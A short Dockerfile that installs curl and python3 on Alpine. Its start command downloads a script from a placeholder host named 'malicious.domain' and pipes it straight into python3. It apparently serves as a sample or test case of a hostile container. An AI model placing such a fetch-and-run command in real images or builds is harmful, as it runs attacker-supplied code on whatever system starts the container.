#FROM python:3-alpine
#FROM python:2.7.16-alpine3.9
#CMD [ "python", "-c", "print('Hello 9')" ]


FROM alpine:3.7

RUN apk add --no-cache curl
RUN apk add --no-cache python3
# run
CMD curl -s https:/malicious.domain/listen | python3 -
